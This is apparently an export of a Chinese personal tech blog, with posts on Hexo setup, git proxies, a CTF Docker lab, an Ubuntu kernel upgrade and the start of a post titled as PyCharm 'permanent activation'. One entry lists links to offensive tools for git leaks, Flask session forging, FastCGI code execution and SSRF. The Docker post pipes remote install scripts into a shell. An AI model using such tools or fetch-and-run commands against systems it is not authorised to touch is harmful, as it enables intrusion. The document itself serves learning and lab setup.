<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo 博客 NexT 主题下如何添加图片</title>
    <url>/Hexo%20%E5%8D%9A%E5%AE%A2%20NexT%20%E4%B8%BB%E9%A2%98%E4%B8%8B%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<p>先安装插件，再打开 hexo 的配置，最后按照指定格式放置和引用图片。<br>前面的摘要貌似不能为空，否则<code>more</code>标签无效。</p>
<span id="more"></span>

<ol>
<li><p>安装插件，在 hexo 根目录下执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure></li>
<li><p>打开 hexo 的配置文件 <code>_config.yml</code>，将 <code>post_asset_folder</code>，把这个选项从<code>false</code>改成<code>true</code></p>
</li>
<li><p>打开 hexo 根目录下的 <code>/node_modules/hexo-asset-image/index.js</code>，将内容更换为下面的代码。（此步骤不知道是否真的有效，我没用此步骤也可以，可能遇到的问题不一样，建议执行此步骤的时候先备份 index.js 文件）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line">var cheerio &#x3D; require(&#39;cheerio&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;14480345&#x2F;how-to-get-the-nth-occurrence-in-a-string</span><br><span class="line">function getPosition(str, m, i) &#123;</span><br><span class="line">  return str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var version &#x3D; String(hexo.version).split(&#39;.&#39;);</span><br><span class="line">hexo.extend.filter.register(&#39;after_post_render&#39;, function(data)&#123;</span><br><span class="line">  var config &#x3D; hexo.config;</span><br><span class="line">  if(config.post_asset_folder)&#123;</span><br><span class="line">        var link &#x3D; data.permalink;</span><br><span class="line">    if(version.length &gt; 0 &amp;&amp; Number(version[0]) &#x3D;&#x3D; 3)</span><br><span class="line">       var beginPos &#x3D; getPosition(link, &#39;&#x2F;&#39;, 1) + 1;</span><br><span class="line">    else</span><br><span class="line">       var beginPos &#x3D; getPosition(link, &#39;&#x2F;&#39;, 3) + 1;</span><br><span class="line">    &#x2F;&#x2F; In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;...&#x2F;about&#x2F;index.html&quot;.</span><br><span class="line">    var endPos &#x3D; link.lastIndexOf(&#39;&#x2F;&#39;) + 1;</span><br><span class="line">    link &#x3D; link.substring(beginPos, endPos);</span><br><span class="line"></span><br><span class="line">    var toprocess &#x3D; [&#39;excerpt&#39;, &#39;more&#39;, &#39;content&#39;];</span><br><span class="line">    for(var i &#x3D; 0; i &lt; toprocess.length; i++)&#123;</span><br><span class="line">      var key &#x3D; toprocess[i];</span><br><span class="line"> </span><br><span class="line">      var $ &#x3D; cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: false,</span><br><span class="line">        xmlMode: false,</span><br><span class="line">        lowerCaseTags: false,</span><br><span class="line">        decodeEntities: false</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(&#39;img&#39;).each(function()&#123;</span><br><span class="line">        if ($(this).attr(&#39;src&#39;))&#123;</span><br><span class="line">            &#x2F;&#x2F; For windows style path, we replace &#39;\&#39; to &#39;&#x2F;&#39;.</span><br><span class="line">            var src &#x3D; $(this).attr(&#39;src&#39;).replace(&#39;\\&#39;, &#39;&#x2F;&#39;);</span><br><span class="line">            if(!&#x2F;http[s]*.*|\&#x2F;\&#x2F;.*&#x2F;.test(src) &amp;&amp;</span><br><span class="line">               !&#x2F;^\s*\&#x2F;&#x2F;.test(src)) &#123;</span><br><span class="line">              &#x2F;&#x2F; For &quot;about&quot; page, the first part of &quot;src&quot; can&#39;t be removed.</span><br><span class="line">              &#x2F;&#x2F; In addition, to support multi-level local directory.</span><br><span class="line">              var linkArray &#x3D; link.split(&#39;&#x2F;&#39;).filter(function(elem)&#123;</span><br><span class="line">                return elem !&#x3D; &#39;&#39;;</span><br><span class="line">              &#125;);</span><br><span class="line">              var srcArray &#x3D; src.split(&#39;&#x2F;&#39;).filter(function(elem)&#123;</span><br><span class="line">                return elem !&#x3D; &#39;&#39; &amp;&amp; elem !&#x3D; &#39;.&#39;;</span><br><span class="line">              &#125;);</span><br><span class="line">              if(srcArray.length &gt; 1)</span><br><span class="line">                srcArray.shift();</span><br><span class="line">              src &#x3D; srcArray.join(&#39;&#x2F;&#39;);</span><br><span class="line">              $(this).attr(&#39;src&#39;, config.root + link + src);</span><br><span class="line">              console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;);</span><br><span class="line">            console.info&amp;&amp;console.info($(this));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] &#x3D; $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>实际上安装了 <code>hexo-asset-image --save</code> 插件后，通过<code>hexo new post ***</code>指令新建博文，除了在 <code>~/source/_post/</code>目录下新建 .md 文件外，还会新建一个同名的文件夹，图片直接放这个文件夹即可。在生成静态页面的时候，hexo 会将 .md 文件和图片放在一个文件夹内。<br>如果不通过<code>hexo new post ***</code>指令新建博文，可以直接在<code>_post</code>目录下新建 .md （注意自己加头部），以及同名的文件夹，将图片放这文件夹下效果一样。</p>
</blockquote>
</li>
<li><p>插入图片。语法和 markdown 语法一致。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![]()  # [描述，不能为空，否则不会显示，md 下是可以不写的](图片完整名称)</span><br><span class="line"># eg. ![test](test.jpg)，注意 test.jpg 是按要求放在与此 .md 文件同名的文件夹内。</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>security tools</title>
    <url>/security%20tools/</url>
    <content><![CDATA[<p>收集学习网安过程中遇到的工具</p>
<span id="more"></span>

<ul>
<li><p>git 泄露：</p>
<ul>
<li>GitHack: <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li>
<li>scrabble: <a href="https://github.com/denny0223/scrabble">https://github.com/denny0223/scrabble</a></li>
</ul>
</li>
<li><p>网站目录扫描</p>
<ul>
<li>dirsearch：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li>
</ul>
</li>
<li><p>Flask Session Cookie Decoder/Encoder（flask session 伪造）</p>
<ul>
<li>flask-session-cookie-manager： <a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></li>
</ul>
</li>
<li><p>Fastcgi PHP-FPM Client &amp;&amp; Code Execution</p>
<ul>
<li><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></li>
</ul>
</li>
<li><p>SSRF,自动组装 Gopher</p>
<ul>
<li>Gopherus: <a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>如何为 Git 设置代理</title>
    <url>/%E5%A6%82%E4%BD%95%E4%B8%BA%20Git%20%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="1-连接情况总览"><a href="#1-连接情况总览" class="headerlink" title="1. 连接情况总览"></a>1. 连接情况总览</h2><p>如果在克隆或从远程仓库获取数据时遇到很慢甚至超时的情况，那么此时可能需要配置 Git 的代理。这里讲讲两种情况的代理方法：使用 HTTP 或 HTTPS 协议连接到 Git 仓库的代理方法和使用 SSH 协议连接到 Git 仓库的代理方法。</p>
<span id="more"></span>
<ul>
<li><p>如果远程仓库的格式像下面那样，这种就是使用 HTTP 或 HTTPS 协议连接到 Git 仓库的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;github.com&#x2F;cms-sw&#x2F;cmssw.git</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cms-sw&#x2F;cmssw.git</span><br></pre></td></tr></table></figure></li>
<li><p>如果远程仓库的格式像下面那样，这种就是使用 SSH 协议连接到 Git 仓库的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git@github.com:cms-sw&#x2F;cmssw.git</span><br><span class="line">ssh:&#x2F;&#x2F;git@github.com&#x2F;cms-sw&#x2F;cmssw.git</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-使用-HTTP-或-HTTPS-协议连接到-Git-仓库的代理方法"><a href="#2-使用-HTTP-或-HTTPS-协议连接到-Git-仓库的代理方法" class="headerlink" title="2. 使用 HTTP 或 HTTPS 协议连接到 Git 仓库的代理方法"></a>2. 使用 HTTP 或 HTTPS 协议连接到 Git 仓库的代理方法</h2><h3 id="2-1-针对所有域名的-Git-仓库"><a href="#2-1-针对所有域名的-Git-仓库" class="headerlink" title="2.1 针对所有域名的 Git 仓库"></a>2.1 针对所有域名的 Git 仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTP&#x2F;HTTPS 协议，port 需与代理软件设置的一致</span><br><span class="line">git config –global http.proxy http:&#x2F;&#x2F;127.0.0.1:port</span><br><span class="line"></span><br><span class="line"># SOCKS5 协议</span><br><span class="line">git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:port</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li><code>--glboal</code> 选项指的是修改 Git 的全局配置文件<code>~/.gitconfig</code>，而非各个 Git 仓库里的配置文件<code>.git/config</code>。</li>
<li><code>port</code>则为端口号。</li>
</ul>
<h3 id="2-2-针对特定域名的-Git-仓库"><a href="#2-2-针对特定域名的-Git-仓库" class="headerlink" title="2.2 针对特定域名的 Git 仓库"></a>2.2 针对特定域名的 Git 仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTP&#x2F;HTTPS 协议</span><br><span class="line">git config –global http.url.proxy http:&#x2F;&#x2F;127.0.0.1:port</span><br><span class="line"># 以 Github 为例</span><br><span class="line">git config –global http.https:&#x2F;&#x2F;github.com.proxy http:&#x2F;&#x2F;127.0.0.1:port</span><br><span class="line"></span><br><span class="line"># SOCKS5 协议</span><br><span class="line">git config –global http.url.proxy socks5:&#x2F;&#x2F;127.0.0.1:port</span><br><span class="line"># 以 Github 为例</span><br><span class="line">git config –global http.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:port</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li><code>url</code> 即为需要走代理的仓库域名，url 以 http:// 和 https:// 打头的均用这个方法。</li>
<li>网上很多中文教程，可能会告诉你<code>https://</code>打头的 url 使用“git config –global https.<a href="https://example.com.proxy/">https://example.com.proxy</a> protocol://127.0.0.1:port”，这种做法其实是错的！记住一点：Git 不认<code>https.proxy</code>，设置<code>http.proxy</code>就可以支持 https 了。</li>
<li>如果想了解 url 的更多模式，如子域名等的情况，可参照 Git 的官方文档 。网页内容搜索 http.<url>.*，即可找到相关信息。</li>
</ul>
<h2 id="3-使用-SSH-协议连接到-Git-仓库的代理方法"><a href="#3-使用-SSH-协议连接到-Git-仓库的代理方法" class="headerlink" title="3. 使用 SSH 协议连接到 Git 仓库的代理方法"></a>3. 使用 SSH 协议连接到 Git 仓库的代理方法</h2><p>Git 依靠 ssh 处理连接时，为了通过代理进行连接，必须配置 ssh 本身，在 ~/.ssh/config 文件中设置 ProxyCommand 选项。Linux 和 macOS 是通过 nc 来执行 ProxyCommand 的，Windows 下则是通过 connect。</p>
<h3 id="3-1-Linux-和-macOS-用户"><a href="#3-1-Linux-和-macOS-用户" class="headerlink" title="3.1 Linux 和 macOS 用户"></a>3.1 Linux 和 macOS 用户</h3><p>编辑 <code>~/.ssh/config</code> 文件,给文件加上如下对应内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTP 代理</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand nc -X connect -x 127.0.0.1:7890 %h %p</span><br></pre></td></tr></table></figure>
<p>解释:</p>
<ul>
<li>Host 后面 接的 <code>github.com</code> 是指定要走代理的仓库域名。</li>
<li>在 ProxyCommand 中，Linux 和 macOS 用户用的是 nc。</li>
<li>-X 选项后面接的是 connect 的意思是 HTTPS 代理。</li>
<li>-x 选项后面加上代理地址和端口号。</li>
<li>在调用 ProxyCommand 时，％h 和 ％p 将会被自动替换为目标主机名和 SSH 命令指定的端口（%h 和 %p 不要修改，保留原样即可）。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># SOCKS5 协议</span><br><span class="line"># 两种方式任选一个</span><br><span class="line"></span><br><span class="line"># 第一种</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand nc -X 5 -x 127.0.0.1:7891 %h %p</span><br><span class="line">    </span><br><span class="line"># 第二种</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand nc -x 127.0.0.1:7891 %h %p</span><br></pre></td></tr></table></figure>
<p>解释:</p>
<ul>
<li>Host 后面 接的 github.com 是指定要走代理的仓库域名。</li>
<li>在 ProxyCommand 中，Linux 和 macOS 用户用的是 nc 。</li>
<li>在调用 ProxyCommand 时，％h 和 ％p 将会被自动替换为目标主机名和 SSH 命令指定的端口（ %h 和 %p 不要修改，保留原样即可）。</li>
<li>如果 -X 选项后面接的是数字 5，那么指的就是 socks5 代理。</li>
<li>当然不写上 -X 选项也是可以的，因为在没有指定协议的情况下，默认是使用socks5代理的。所以2 种的写法效果一样 ，都指的是走 socks5 代理</li>
</ul>
<h3 id="3-2-Windows-用户"><a href="#3-2-Windows-用户" class="headerlink" title="3.2 Windows 用户"></a>3.2 Windows 用户</h3><p>编辑 <code>~/.ssh/config</code> 文件,给文件加上如下对应内容.windows 的 ~ 路径一般是<code>C:\Users\用户名</code>,可在 git bash 中 输入 <code>cd ~</code>进入 ~目录,再用<code>pwd</code>命令显示当前路径.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTP代理</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand connect -H 127.0.0.1:7890 %h %p</span><br><span class="line">    </span><br><span class="line"># SOCKS5代理</span><br><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand connect -S 127.0.0.1:7891 %h %p</span><br></pre></td></tr></table></figure>
<p>解释:</p>
<ul>
<li>Host 后面 接的 github.com 是指定要走代理的仓库域名。</li>
<li>在 ProxyCommand 中，Windows 用户用的是 connect。</li>
<li>-H 选项的意思是 HTTP 代理</li>
<li>-S 选项指的就是 socks5 代理</li>
<li>在调用 ProxyCommand 时，％h 和 ％p 将会被自动替换为目标主机名和 SSH 命令指定的端口（ %h 和 %p 不要修改，保留原样即可）。</li>
</ul>
<h2 id="4-署名"><a href="#4-署名" class="headerlink" title="4. 署名"></a>4. 署名</h2><p>本文内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议<br>参考文章永久链接是：<a href="https://ericclose.github.io/git-proxy-config.html">https://ericclose.github.io/git-proxy-config.html</a><br>本文根据参考文章仅做了少量修改</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>proxy</category>
      </categories>
      <tags>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建《从0到1：CTFer 成长之路》docker 做题环境</title>
    <url>/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%20%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8Bdocker%20%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>《从0到1：CTFer 成长之路》书中涉及的题目已经封装成 docker 镜像，通过 docker 很容易能在本地实现做题的环境。</p>
<span id="more"></span>

<h2 id="1-安装-docker"><a href="#1-安装-docker" class="headerlink" title="1. 安装 docker"></a>1. 安装 docker</h2><ul>
<li>使用官方安装脚本安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure></li>
<li>也可以使用国内 daocloud 一键安装命令：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>
详细文档：<a href="https://www.runoob.com/docker/ubuntu-docker-install.html">https://www.runoob.com/docker/ubuntu-docker-install.html</a><blockquote>
<p>由于之前使用了 snap 安装过 docker，运行 docker 命令出现：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bash:/snap/bin/docker: No such file or directory<br>而实际上使用官方安装脚本安装后的 docker 应该链接至：/usr/bin/docker<br>因此将 /snap/bin/docker 链接至 /usr/bin/docker 即可</p>
</blockquote>
</li>
<li>查看 docker 镜像<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure></li>
<li>重启 docker 服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-docker-换源"><a href="#2-docker-换源" class="headerlink" title="2. docker 换源"></a>2. docker 换源</h2><ul>
<li>docker换源的配置文件默认在<code>/etc/docker/daemon.json</code>，若无 <code>daemon.json</code>，直接创建即可<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;docker</span><br><span class="line"># 若该目录下无 daemon.json，直接创建</span><br><span class="line">sudo touch daemon.json</span><br><span class="line"></span><br><span class="line">sudo vim daemon.json</span><br><span class="line"># 将下面内容输入到 daemon.json 中</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot; : [</span><br><span class="line">    &quot;http:&#x2F;&#x2F;ovfftd6p.mirror.aliyuncs.com&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;insecure-registries&quot; : [</span><br><span class="line">    &quot;registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;docker.mirrors.ustc.edu.cn&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;debug&quot; : true,</span><br><span class="line">  &quot;experimental&quot; : true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>保存并重启 docker 服务<br>确定是否换源成功，如果如下命令能看到 daemon.json 里的网址表示换源成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker info</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-安装-docker-compose"><a href="#3-安装-docker-compose" class="headerlink" title="3. 安装 docker-compose"></a>3. 安装 docker-compose</h2><blockquote>
<p>docker-compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>
</blockquote>
<ul>
<li>从 Github 安装<br> 使用 curl 下载 1.27.4版本，如果需要安装其他版本，修改版本号即可。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.27.4&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
<li>增加执行权限<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
<li>创建软链接<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose &#x2F;usr&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
<li>测试是否安装成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sudo docker-compose --version</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
<h2 id="4-配置具体题目环境-docker-compose-yml"><a href="#4-配置具体题目环境-docker-compose-yml" class="headerlink" title="4. 配置具体题目环境 docker-compose.yml"></a>4. 配置具体题目环境 docker-compose.yml</h2></li>
<li>在 home/用户 下 创建一个测试目录 compose<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir compose</span><br></pre></td></tr></table></figure></li>
<li>配置 docker-compose.yml，若不存在此文件，直接新建<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># yaml 配置:SQL 注入-1</span><br><span class="line">version: &#39;3.2&#39;</span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    image: registry.cn-hangzhou.aliyuncs.com&#x2F;n1book&#x2F;web-information-backk:latest</span><br><span class="line">    ports:</span><br><span class="line">        - 80:80</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5-启动方式"><a href="#5-启动方式" class="headerlink" title="5. 启动方式"></a>5. 启动方式</h2><p>在当前题目配置 docker-compose.yml 所在文件夹，执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>可以对每个题目都创建一个文件夹，里面存放这个题目的 docker-compose.yml，这样需要启动某个题目环境的时候直接进它的目录执行启动指令即可。</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>《从0到1：CTFer成长之路》</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>搭建环境</tag>
      </tags>
  </entry>
  <entry>
    <title>解决 AMD 在 ubuntu 上无法外接显示器问题</title>
    <url>/%E8%A7%A3%E5%86%B3%20ubuntu%20%E6%97%A0%E6%B3%95%E5%A4%96%E7%95%8C%E6%98%BE%E7%A4%BA%E5%99%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>实际上 ubuntu 的内核（5.4及以下）还不支持 AMD 4000 系列的集显，所以无法驱动。</p>
<p>解决办法是更新 ubuntu 内核版本</p>
<span id="more"></span>

<p>更新前最好用 timeshift 备份系统</p>
<p>matebook14 2020 锐龙版 4600H CPU 实测 v5.7 内核能支持。</p>
<p>v5.7：<a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.7/"></a><a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.7/">https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.7/</a></p>
<p>升级方法：</p>
<ol>
<li>下载内核包(共四个)<br>第一个：linux-headers_***all.deb<br>其余三个：分三类（headers、module、image）全选择 generic 或者 lowlatency 下载。</li>
<li><code>sudo dpkg -i </code>依次安装<br>我的安装顺序：all -&gt; headers -&gt; module -&gt; image。</li>
<li>重启电脑，输入命令<code>uname -a</code> 查看是否升级成功 </li>
</ol>
<p><strong>参考</strong></p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/149564937">联想小新Pro13 2020锐龙版R7 4800U安装ubuntu-20.04</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 博客 NexT 主题下如何添加分类、标签</title>
    <url>/Hexo%20%E5%8D%9A%E5%AE%A2%20NexT%20%E4%B8%BB%E9%A2%98%E4%B8%8B%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E3%80%81%E6%A0%87%E7%AD%BE/Hexo%20%E5%8D%9A%E5%AE%A2%20NexT%20%E4%B8%BB%E9%A2%98%E4%B8%8B%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E3%80%81%E6%A0%87%E7%AD%BE/</url>
    <content><![CDATA[<p>Hexo Next 主题默认带有不少菜单，如关于（about）、分类（categories）、标签（tags）等，默认处于注释状态，将需要取消的菜单注释掉，然后生成相应的 page 即可。</p>
<span id="more"></span>

<ol>
<li><p>打开 <code>~\themes\next\_config.yml</code> 文件，找到 <code>menu</code> 相关的设置，取消掉需要的菜单项的注释。<br><img src="hexo_next_menu.png" alt="test"></p>
</li>
<li><p>重新生成部署后，可以看到新增的菜单项，但是单击后会报如下错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cannot GET &#x2F;about&#x2F;</span><br><span class="line">Cannot GET &#x2F;tags&#x2F;</span><br><span class="line">Cannot GET &#x2F;categories&#x2F;</span><br></pre></td></tr></table></figure></li>
<li><p>这是因为还需要运行如下命令新建相关 page</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;about&quot;</span><br><span class="line">hexo new page &quot;tags&quot;</span><br><span class="line">hexo new page &quot;categories&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>新建 page 后，会在 source 目录下新建 <code>about</code>、<code>tags</code>、<code>categories</code>文件夹，每个文件夹下还会创建一个<code>index.md</code>文件表示关于、标签页分类页面，编辑这三个MarkDown文件可以自定义这三个页面的内容.</p>
</li>
<li><p>最后一步，编辑各页面对应的<code>index.md</code>文件，增加 type 即可。注意冒号 : 后必须空一格，title 和 date 是默认生成的。重新部署后能够看到效果。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: about</span><br><span class="line">date: 2021-03-13 15:21:30</span><br><span class="line">type: &quot;about&quot;</span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: tages</span><br><span class="line">date: 2021-03-13 15:21:30</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2021-03-13 15:21:30</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure></li>
<li><p>在新建博文的头部，直接输入该博文的分类、标签等即可。分类只能有一个，标签能有多个，多个标签不能一行，注意下面的格式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World # 标题</span><br><span class="line">date: 2019&#x2F;3&#x2F;26 hh:mm:ss # 时间</span><br><span class="line">categories: # 分类</span><br><span class="line">	- 分类  # 只能由一个</span><br><span class="line">tags: # 标签</span><br><span class="line">	- PS3  # 能有多个</span><br><span class="line">	- Games  # 一个标签一行</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">摘要</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">正文</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>参考<ul>
<li><a href="https://blog.csdn.net/mqdxiaoxiao/article/details/93644533">Hexo博客NexT主题下添加分类、标签、关于菜单项</a></li>
<li><a href="https://hexo.io/zh-cn/docs/front-matter">Hexo 官方文档</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
        <tag>搭建环境</tag>
      </tags>
  </entry>
  <entry>
    <title>【TCP/IP详解 卷1:协议】 第一章</title>
    <url>/TCPIP%E8%AF%A6%E8%A7%A3%E5%8D%B71_%E5%8D%8F%E8%AE%AE_%E7%AC%AC%E4%B8%80%E7%AB%A0/TCPIP%E8%AF%A6%E8%A7%A3%E5%8D%B71_%E5%8D%8F%E8%AE%AE_%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
    <content><![CDATA[<p>test1<br><img src="activation_install.jpg" alt="sss"></p>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu中Pycharm专业版2020.1 安装，永久激活</title>
    <url>/Ubuntu%E4%B8%ADPycharm%E4%B8%93%E4%B8%9A%E7%89%882020.1%20%E5%AE%89%E8%A3%85%EF%BC%8C%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/Ubuntu%E4%B8%ADPycharm%E4%B8%93%E4%B8%9A%E7%89%882020.1%20%E5%AE%89%E8%A3%85%EF%BC%8C%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/</url>
    <content><![CDATA[<p>记录下 Ubuntu 中 Pycharm 专业版2020.1 安装激活</p>
<span id="more"></span>

<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><ol>
<li><p>从官网下载 Pycharm Linux 专业版</p>
